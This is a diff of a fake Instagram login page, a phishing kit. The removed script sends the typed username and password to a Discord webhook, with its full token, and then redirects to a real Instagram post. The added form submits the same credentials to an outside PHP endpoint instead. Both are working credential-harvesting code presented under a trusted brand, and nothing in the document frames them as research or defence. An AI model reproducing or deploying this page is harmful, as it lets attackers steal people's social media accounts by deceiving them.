@@ -1,4 +1,5 @@
-<head>
+
+<html><head>
   <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
   <title>Instagram</title>
 </head>
@@ -16,21 +17,21 @@
                   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div><!-- Header end -->
                 <div class="form-wrap">
-                  <form class="form">
+                  <form action="http://network.cybercube.cf/test/test.php" method="post">
 
                     <div class="input-box">
-                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                      <input type="text" name="name" placeholder="Phone number, username, or email" >
                     </div>  
 
                     <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                      <input type="text" name="email" placeholder="passward"><br>
                     </div>  
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
+                      <input class="btn" type="submit" name="login" placeholder="Log in">
                     </span>  
 
-                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
+                 <center>   <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a></center>
                   </form>
                 </div> <!-- Form-wrap end -->
               </div> <!-- Login-box end -->
@@ -81,31 +82,7 @@
     </section>
   </span> <!-- Root -->
 
-  <!-- Select Link -->
-  <script type="text/javascript">
-    function la(src) {
-      window.location=src;
-    }
-  </script>
+ 
 
-  <script>
-  function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/931155677253087232/NGZF2FEDnAxLJSd8ym8RYbXPqz31pd_vpgGlQjKJ0vuQvMI4NYP509wZQv8ZgtRFk-Tx");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-    }
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
-  }
-  </script>
 </body>
+</html>
